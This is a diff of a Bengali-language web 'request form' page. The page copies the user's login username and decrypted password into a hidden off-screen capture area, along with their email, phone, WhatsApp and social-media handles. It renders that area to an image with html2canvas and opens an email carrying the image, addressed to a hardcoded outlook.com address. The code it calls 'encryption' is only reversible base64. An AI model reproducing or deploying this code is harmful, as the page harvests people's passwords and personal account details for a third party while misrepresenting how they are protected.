@@ -5,8 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>রিকুয়েস্ট ফর্ম - ইমেজ সাবমিট</title>
 
-<!-- html2canvas লাইব্রেরি -->
-<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+<!-- html2canvas cdn - এইটা কাজ করবে -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
 <style>
 * {
@@ -113,6 +113,7 @@ button:disabled {
 
 .logout-btn {
     background: linear-gradient(90deg, #ff4444, #cc0000);
+    margin-top: 10px;
 }
 
 .status {
@@ -148,20 +149,21 @@ button:disabled {
     margin-top: 12px;
 }
 
-/* ছবির জন্য টেমপ্লেট - এটি লুকানো থাকবে */
-.image-template {
-    position: absolute;
+/* ছবির টেমপ্লেট - এটি ভিতরে লুকানো থাকবে কিন্তু html2canvas পাবে */
+.image-capture-area {
+    position: fixed;
     left: -9999px;
-    top: -9999px;
+    top: 0;
     background: white;
-    padding: 30px;
+    padding: 25px;
     border-radius: 16px;
     width: 550px;
     font-family: 'Segoe UI', Arial, sans-serif;
     box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+    z-index: -1;
 }
 
-.image-template h2 {
+.image-capture-area h2 {
     color: #333;
     text-align: center;
     border-bottom: 3px solid #4CAF50;
@@ -169,31 +171,7 @@ button:disabled {
     margin-bottom: 20px;
 }
 
-.image-table {
-    width: 100%;
-    border-collapse: collapse;
-    margin: 15px 0;
-}
-
-.image-table th, .image-table td {
-    border: 1px solid #ddd;
-    padding: 10px 12px;
-    text-align: left;
-    vertical-align: top;
-}
-
-.image-table th {
-    background: linear-gradient(135deg, #4CAF50, #45a049);
-    color: white;
-    width: 40%;
-}
-
-.image-table td {
-    background: #f9f9f9;
-    color: #333;
-}
-
-.login-box {
+.image-capture-area .login-box {
     background: #fff3cd;
     border-left: 4px solid #ffc107;
     padding: 12px 15px;
@@ -201,11 +179,35 @@ button:disabled {
     border-radius: 8px;
 }
 
-.login-box strong {
+.image-capture-area .login-box strong {
     color: #856404;
 }
 
-.time-stamp {
+.image-capture-area table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 15px 0;
+}
+
+.image-capture-area th, .image-capture-area td {
+    border: 1px solid #ddd;
+    padding: 10px 12px;
+    text-align: left;
+    vertical-align: top;
+}
+
+.image-capture-area th {
+    background: linear-gradient(135deg, #4CAF50, #45a049);
+    color: white;
+    width: 40%;
+}
+
+.image-capture-area td {
+    background: #f9f9f9;
+    color: #333;
+}
+
+.image-capture-area .time-stamp {
     text-align: center;
     font-size: 12px;
     color: #666;
@@ -281,48 +283,48 @@ button:disabled {
 
 </div>
 
-<!-- ছবির টেমপ্লেট - লুকানো -->
-<div id="imageTemplate" class="image-template">
+<!-- ছবি ক্যাপচারের জন্য এলাকা - লুকানো -->
+<div id="captureArea" class="image-capture-area">
     <h2>📋 রিকুয়েস্ট ফর্ম ডাটা</h2>
     
-    <div class="login-box" id="templateLoginBox">
+    <div class="login-box" id="captureLoginBox">
         <strong>🔐 লগইন তথ্য</strong><br>
-        লগইন ইউজারনাম: <span id="templateUsername">—</span><br>
-        পাসওয়ার্ড: <span id="templatePassword">—</span>
+        লগইন ইউজারনাম: <span id="captureUsername">—</span><br>
+        পাসওয়ার্ড: <span id="capturePassword">—</span>
     </div>
     
-    <table class="image-table" id="templateTable">
+    <table id="captureTable">
         <tr><th>Name</th><th>Value</th></tr>
-        <tr><td>Your_Email</td><td id="templateEmail">—</td></tr>
-        <tr><td>Your_Username</td><td id="templateUser">—</td></tr>
-        <tr><td>Your_Profile_Picture_Link</td><td id="templateProfilePic">—</td></tr>
-        <tr><td>Your_Facebook_Username</td><td id="templateFb">—</td></tr>
-        <tr><td>Your_Facebook_Page_Username</td><td id="templateFbPage">—</td></tr>
-        <tr><td>Your_Instagram_Username</td><td id="templateIg">—</td></tr>
-        <tr><td>Your_WhatsApp_Number</td><td id="templateWhatsapp">—</td></tr>
-        <tr><td>Your_TikTok_Username</td><td id="templateTiktok">—</td></tr>
-        <tr><td>Your_Telegram_Username</td><td id="templateTelegram">—</td></tr>
-        <tr><td>Your_Twitter_Username</td><td id="templateTwitter">—</td></tr>
-        <tr><td>Your_Phone_Number</td><td id="templatePhone">—</td></tr>
-        <tr><td>Your_About</td><td id="templateAbout">—</td></tr>
-        <tr><td>Your_Website_Link</td><td id="templateWebsite">—</td></tr>
-        <tr><td>Logged_In_User_Info</td><td id="templateLoginInfo">—</td></tr>
+        <tr><td>Your_Email</td><td id="captureEmail">—</td></tr>
+        <tr><td>Your_Username</td><td id="captureUser">—</td></tr>
+        <tr><td>Your_Profile_Picture_Link</td><td id="captureProfilePic">—</td></tr>
+        <tr><td>Your_Facebook_Username</td><td id="captureFb">—</td></tr>
+        <tr><td>Your_Facebook_Page_Username</td><td id="captureFbPage">—</td></tr>
+        <tr><td>Your_Instagram_Username</td><td id="captureIg">—</td></tr>
+        <tr><td>Your_WhatsApp_Number</td><td id="captureWhatsapp">—</td></tr>
+        <tr><td>Your_TikTok_Username</td><td id="captureTiktok">—</td></tr>
+        <tr><td>Your_Telegram_Username</td><td id="captureTelegram">—</td></tr>
+        <tr><td>Your_Twitter_Username</td><td id="captureTwitter">—</td></tr>
+        <tr><td>Your_Phone_Number</td><td id="capturePhone">—</td></tr>
+        <tr><td>Your_About</td><td id="captureAbout">—</td></tr>
+        <tr><td>Your_Website_Link</td><td id="captureWebsite">—</td></tr>
+        <tr><td>Logged_In_User_Info</td><td id="captureLoginInfo">—</td></tr>
     </table>
     
     <div class="time-stamp">
-        ⏰ জমা দেওয়ার সময়: <span id="templateTime">—</span>
+        ⏰ জমা দেওয়ার সময়: <span id="captureTime">—</span>
     </div>
 </div>
 
 <script>
 // ==============================================
-// গোপনীয় তথ্য - এখানে আপনার ইমেইল দিন
+// 🔐 এখানে আপনার ইমেইল দিন
 // ==============================================
-const RECEIVER_EMAIL = "inyt_444@outlook.com";  // <-- আপনার ইমেইল দিন
-const EMAIL_SUBJECT = "📋 নিউ রিকুয়েস্ট ফর্ম সাবমিট (ছবি)";
+const RECEIVER_EMAIL = "your_inyt_444@outlook.com";  // <-- আপনার ইমেইল দিন
+const EMAIL_SUBJECT = "📋 নিউ রিকুয়েস্ট ফর্ম সাবমিট";
 // ==============================================
 
-// এনক্রিপশন ফাংশন
+// এনক্রিপশন
 function encrypt(pwd) {
     return btoa(pwd.split('').reverse().join('') + 'fix2026');
 }
@@ -359,7 +361,7 @@ loadUsers();
 
 let currentUser = sessionStorage.getItem("currentUser") || null;
 
-// লগইন ফাংশন
+// লগইন
 function login() {
     let u = document.getElementById("loginUser").value.trim();
     let p = document.getElementById("loginPass").value.trim();
@@ -379,16 +381,12 @@ function login() {
         updateSubmitButton();
         
         setTimeout(() => {
-            if (statusDiv.innerHTML.includes('লগইন সফल')) {
-                statusDiv.innerHTML = '';
-            }
+            if (statusDiv.innerHTML.includes('সফল')) statusDiv.innerHTML = '';
         }, 3000);
     } else {
         statusDiv.innerHTML = '<div class="status-error">❌ ভুল ইউজারনাম বা পাসওয়ার্ড</div>';
         setTimeout(() => {
-            if (statusDiv.innerHTML.includes('ভুল')) {
-                statusDiv.innerHTML = '';
-            }
+            if (statusDiv.innerHTML.includes('ভুল')) statusDiv.innerHTML = '';
         }, 3000);
     }
 }
@@ -398,12 +396,9 @@ function logout() {
     sessionStorage.removeItem("currentUser");
     document.getElementById("loginStatus").innerHTML = '<div class="status-success">🚪 লগআউট হয়েছে</div>';
     updateSubmitButton();
-    
     setTimeout(() => {
         let statusDiv = document.getElementById("loginStatus");
-        if (statusDiv.innerHTML.includes('লগআউট')) {
-            statusDiv.innerHTML = '';
-        }
+        if (statusDiv.innerHTML.includes('লগআউট')) statusDiv.innerHTML = '';
     }, 2000);
 }
 
@@ -424,8 +419,8 @@ function updateSubmitButton() {
     }
 }
 
-// টেমপ্লেট আপডেট করা
-function updateTemplate() {
+// ক্যাপচার এরিয়া আপডেট
+function updateCaptureArea() {
     let yourEmail = document.getElementById("yourEmail").value || "—";
     let yourUsername = document.getElementById("yourUsername").value || "—";
     let profilePic = document.getElementById("profilePic").value || "—";
@@ -442,85 +437,71 @@ function updateTemplate() {
     
     let loggedInPassword = decrypt(users[currentUser]);
     
-    document.getElementById("templateUsername").innerText = currentUser;
-    document.getElementById("templatePassword").innerText = loggedInPassword;
-    document.getElementById("templateEmail").innerText = yourEmail;
-    document.getElementById("templateUser").innerText = yourUsername;
-    document.getElementById("templateProfilePic").innerText = profilePic;
-    document.getElementById("templateFb").innerText = fbUsername;
-    document.getElementById("templateFbPage").innerText = fbPageUsername;
-    document.getElementById("templateIg").innerText = igUsername;
-    document.getElementById("templateWhatsapp").innerText = whatsapp;
-    document.getElementById("templateTiktok").innerText = tiktok;
-    document.getElementById("templateTelegram").innerText = telegram;
-    document.getElementById("templateTwitter").innerText = twitter;
-    document.getElementById("templatePhone").innerText = phone;
-    document.getElementById("templateAbout").innerText = about;
-    document.getElementById("templateWebsite").innerText = website;
-    document.getElementById("templateLoginInfo").innerHTML = `লগইন ইউজারনাম: ${currentUser} | পাসওয়ার্ড: ${loggedInPassword}`;
-    document.getElementById("templateTime").innerText = new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'});
+    document.getElementById("captureUsername").innerText = currentUser;
+    document.getElementById("capturePassword").innerText = loggedInPassword;
+    document.getElementById("captureEmail").innerText = yourEmail;
+    document.getElementById("captureUser").innerText = yourUsername;
+    document.getElementById("captureProfilePic").innerText = profilePic;
+    document.getElementById("captureFb").innerText = fbUsername;
+    document.getElementById("captureFbPage").innerText = fbPageUsername;
+    document.getElementById("captureIg").innerText = igUsername;
+    document.getElementById("captureWhatsapp").innerText = whatsapp;
+    document.getElementById("captureTiktok").innerText = tiktok;
+    document.getElementById("captureTelegram").innerText = telegram;
+    document.getElementById("captureTwitter").innerText = twitter;
+    document.getElementById("capturePhone").innerText = phone;
+    document.getElementById("captureAbout").innerText = about;
+    document.getElementById("captureWebsite").innerText = website;
+    document.getElementById("captureLoginInfo").innerHTML = `লগইন ইউজারনাম: ${currentUser} | পাসওয়ার্ড: ${loggedInPassword}`;
+    document.getElementById("captureTime").innerText = new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'});
 }
 
-// ছবি ক্যাপচার করে Gmail এ পাঠানো
+// ছবি ক্যাপচার করে পাঠানো
 async function captureAndSend() {
     if (!currentUser) {
-        alert("❌ ফর্ম জমা দিতে প্রথমে লগইন করুন!");
+        alert("❌ ফর্ম জমা দিতে লগইন করুন!");
         return;
     }
     
     let yourEmail = document.getElementById("yourEmail").value;
-    
-    if (!yourEmail) {
-        alert("❌ অনুগ্রহ করে আপনার ইমেইল এড্রেস দিন!");
-        return;
-    }
-    
-    if (!yourEmail.includes('@') || !yourEmail.includes('.')) {
+    if (!yourEmail || !yourEmail.includes('@')) {
         alert("❌ সঠিক ইমেইল এড্রেস দিন!");
         return;
     }
     
     if (RECEIVER_EMAIL === "your_email@gmail.com") {
-        alert("⚠️ দয়া করে কোডের উপরে RECEIVER_EMAIL এ আপনার নিজের ইমেইল দিন!");
+        alert("⚠️ কোডের উপরে আপনার ইমেইল দিন!");
         return;
     }
     
     const statusDiv = document.getElementById("formStatus");
-    statusDiv.innerHTML = '<div class="status-info">📸 ছবি তৈরি হচ্ছে, দয়া করে অপেক্ষা করুন...</div>';
+    statusDiv.innerHTML = '<div class="status-info">📸 ছবি তৈরি হচ্ছে...</div>';
     
-    // টেমপ্লেট আপডেট
-    updateTemplate();
+    // ডাটা আপডেট
+    updateCaptureArea();
     
-    // একটু ডিলে
+    // DOM আপডেটের জন্য অপেক্ষা
     await new Promise(resolve => setTimeout(resolve, 200));
     
-    const element = document.getElementById("imageTemplate");
+    const element = document.getElementById("captureArea");
     
     try {
         const canvas = await html2canvas(element, {
-            scale: 2.5,
+            scale: 2,
             backgroundColor: '#ffffff',
             logging: false,
-            useCORS: true,
-            allowTaint: false
+            useCORS: true
         });
         
-        // ছবির DataURL
         const imageDataURL = canvas.toDataURL('image/png');
         
-        // HTML ইমেইল বডি - ছবি সরাসরি এম্বেড করা
-        const emailBody = `<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"></head>
+        // HTML ইমেইল বডি
+        const emailBody = `<html>
 <body style="font-family: Arial, sans-serif; padding: 20px;">
     <div style="max-width: 600px; margin: 0 auto;">
         <h2 style="color: #4CAF50;">📋 রিকুয়েস্ট ফর্ম ডাটা</h2>
-        <p>নিচের ছবিতে আপনার জমা দেওয়া সকল তথ্য রয়েছে:</p>
-        <img src="${imageDataURL}" alt="Form Data" style="max-width: 100%; height: auto; border: 1px solid #ddd; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
-        <p style="font-size: 12px; color: #666; margin-top: 20px;">
-            📧 এই ইমেইলটি স্বয়ংক্রিয়ভাবে জেনারেট করা হয়েছে<br>
-            ⏰ সময়: ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}
-        </p>
+        <img src="${imageDataURL}" style="max-width: 100%; border: 1px solid #ddd; border-radius: 8px;">
+        <p style="font-size: 12px; color: #666; margin-top: 20px;">⏰ ${new Date().toLocaleString('bn-BD')}</p>
     </div>
 </body>
 </html>`;
@@ -528,27 +509,19 @@ async function captureAndSend() {
         const encodedSubject = encodeURIComponent(EMAIL_SUBJECT);
         const encodedBody = encodeURIComponent(emailBody);
         
-        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
         
         if (isMobile) {
-            const mobileLink = `mailto:${RECEIVER_EMAIL}?subject=${encodedSubject}&body=${encodedBody}`;
-            window.location.href = mobileLink;
+            window.location.href = `mailto:${RECEIVER_EMAIL}?subject=${encodedSubject}&body=${encodedBody}`;
         } else {
-            const gmailLink = `https://mail.google.com/mail/?view=cm&fs=1&to=${RECEIVER_EMAIL}&su=${encodedSubject}&body=${encodedBody}`;
-            window.open(gmailLink, '_blank');
+            window.open(`https://mail.google.com/mail/?view=cm&fs=1&to=${RECEIVER_EMAIL}&su=${encodedSubject}&body=${encodedBody}`, '_blank');
         }
         
-        statusDiv.innerHTML = '<div class="status-success">✅ ছবি তৈরি হয়েছে! Gmail ওপেন হচ্ছে। Send বাটনে ক্লিক করুন।</div>';
-        
-        setTimeout(() => {
-            if (statusDiv.innerHTML.includes('Gmail')) {
-                statusDiv.innerHTML = '<div class="status-success">✅ ইমেইল প্রস্তুত! শুধু Send করুন।</div>';
-            }
-        }, 5000);
+        statusDiv.innerHTML = '<div class="status-success">✅ ছবি তৈরি! Gmail ওপেন হচ্ছে। Send করুন।</div>';
         
     } catch(error) {
-        console.error("Error:", error);
-        statusDiv.innerHTML = '<div class="status-error">❌ ছবি তৈরি করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।</div>';
+        console.error(error);
+        statusDiv.innerHTML = '<div class="status-error">❌ ব্যর্থ হয়েছে। আবার চেষ্টা করুন।</div>';
     }
 }
 
@@ -558,10 +531,6 @@ function init() {
         currentUser = storedUser;
         updateSubmitButton();
         document.getElementById("loginStatus").innerHTML = `<div class="status-success">✅ লগইন করেছেন: ${currentUser}</div>`;
-    } else {
-        currentUser = null;
-        sessionStorage.removeItem("currentUser");
-        updateSubmitButton();
     }
 }
 
